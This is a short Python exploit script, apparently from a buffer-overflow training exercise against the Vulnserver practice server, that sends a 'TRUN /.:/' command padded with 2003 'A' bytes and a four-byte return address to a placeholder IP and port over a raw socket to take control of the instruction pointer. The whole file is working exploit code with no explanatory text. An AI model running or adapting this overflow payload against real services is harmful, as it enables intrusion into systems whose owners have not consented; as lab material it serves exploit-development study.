#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" 
payload = "TRUN /.:/" + shellcode

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('IP_ADDRESS',PORT))
        s.send((payload.encode()))
        s.close()
except:
        print("Error conecting to the server")
        sys.exit()

